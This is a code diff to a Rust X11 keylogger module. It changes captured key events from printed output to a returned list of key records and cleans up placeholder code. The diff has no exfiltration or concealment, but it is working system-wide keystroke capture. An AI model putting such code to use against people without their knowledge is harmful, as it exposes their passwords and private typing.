@@ -1,4 +1,6 @@
 include!("./keylogger.rs");
+include!("../observers/pub_sub.rs");
+
 
 use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
 use std::thread;
@@ -13,7 +15,7 @@ use x11rb::x11_utils::TryParse;
 
 pub struct XKeylogger {
     exit_flag: Arc<AtomicBool>,
-    handle: Option<thread::JoinHandle<u32>>,
+    handle: Option<thread::JoinHandle<Vec<KeyRecord>>>,
     keymap: HashMap<u8, Vec<String>>,
 }
 
@@ -89,6 +91,7 @@ impl Keylogger for XKeylogger {
                 }
             };
 
+            let mut keys: Vec<KeyRecord> = Vec::new();
 
             // do until exit_flag doesn't change (only changes through stop func)
             while !exit_flag.load(Ordering::SeqCst) {
@@ -97,26 +100,20 @@ impl Keylogger for XKeylogger {
                         if reply.category == 0 { // Core events
                             let data = &reply.data[..];
                             if let Ok((event, _)) = xproto::KeyPressEvent::try_parse(data) {
-                                //            "press"
-                                //        } else {
-                                //            "release"
-                                //        },
-                                //    )
-                                //}
-                                println!("[{}] {} {} {:?}",
-                                    event.time,
-                                    if event.response_type == xproto::KEY_PRESS_EVENT {
-                                        "PRESS"
-                                    } else {
-                                        "RELEASE"
+
+                                let key_name = keymap.get(&event.detail) ;
+
+                                match key_name {
+                                    Some(name) => {
+                                        keys.push(KeyRecord {
+                                            time: event.time,
+                                            key_name: name[0].clone(),
+                                            modifiers: format!("{:?}", event.state),
+                                            press: event.response_type == xproto::KEY_PRESS_EVENT,
+                                        });
                                     },
-                                    if let Some(keysyms) = keymap.get(&event.detail) {
-                                        keysyms[0].as_str()
-                                    } else {
-                                        "Unknown keycode"
-                                    },
-                                    event.state,
-                                );
+                                    None => continue  // UNKNOWN KEY
+                                };
                             }
                         }
                     }
@@ -135,7 +132,7 @@ impl Keylogger for XKeylogger {
                 Err(_) => log::error!("Cannot free context")
             };
 
-            42
+            keys
         });
 
         self.handle = Some(handle);
@@ -147,62 +144,21 @@ impl Keylogger for XKeylogger {
         let handle = match self.handle.take() {
             Some(h) => h,
             None => {
-                log::warn!("Canno stop recording. Recording isn't started.");
+                log::warn!("Cannot stop recording. Recording isn't started.");
                 return Err("Not recording keystrokes");
             }
         };
 
         let result = handle.join();
-        println!("{:?}", result);
-        let k1 = KeyRecord{keycode: 1};
-        let k2 = KeyRecord{keycode: 2};
-        Ok(vec![k1, k2])
-
-        //match &self.handle {
-        //    None => Err("Keylogger isn't recording. Cannot stop."),
-        //    Some(handle) => {
-        //        let res = handle.join();
-        //        println!("{:?}", res);
-        //        let k1 = KeyRecord{keycode: 1};
-        //        let k2 = KeyRecord{keycode: 2};
-        //        self.handle = None;
-        //        Ok(vec![k1, k2])
-        //    }
-        //}
+        match result {
+            Ok(res) => Ok(res),
+            Err(_) => {
+                log::error!("Failed receivig keylogger data from thread");
+                Err("Failed to receive keylogger data")
+            }
+        }
     }
 }
-
-//fn keycode_to_keysym(conn: &impl Connection, keycode: u8, state: u16) -> Result<u32, &'static str> {
-// .reply();
-//    let reply = match match conn.get_keyboard_mapping(keycode, 1) {
-//        Ok(map) => map,
-//        Err(_) => {
-//            log::warn!("Cannot get mapping for keycode {keycode}");
-//            return Err("Failed to get keyboard mapping");
-//        }
-//    }.reply() {
-//        Ok(repl) => repl,
-//        Err(_) => {
-//            log::warn!("Cannot get mapping reply");
-//            return Err("Failed to get keyboard mapping");
-//        }
-//    };
-//
-//    let level = if (state & 0x1) != 0 { 1 } else { 0 };
-//    let group = 0;
-//
-//    // Get keysym using XKB indexing
-//    let keysyms_per_keycode = reply.keysyms_per_keycode as usize;
-//    let index = (group * keysyms_per_keycode) + level;
-//
-//    reply.keysyms.get(index)
-//        .copied()
-//        .ok_or_else(|| {
-//            log::warn!("Cannot get keysym");
-//            "Cannot get keysym"
-//        })
-//}
-//
 
 fn get_keycode_keysym_pairs() -> Result<HashMap<u8, Vec<String>>, &'static str> {
     let xmodmap_output = match Command::new("xmodmap") .arg("-pke").output() {
@@ -247,3 +203,4 @@ fn get_keycode_keysym_pairs() -> Result<HashMap<u8, Vec<String>>, &'static str> 
 
     Ok(keymap)
 }
+
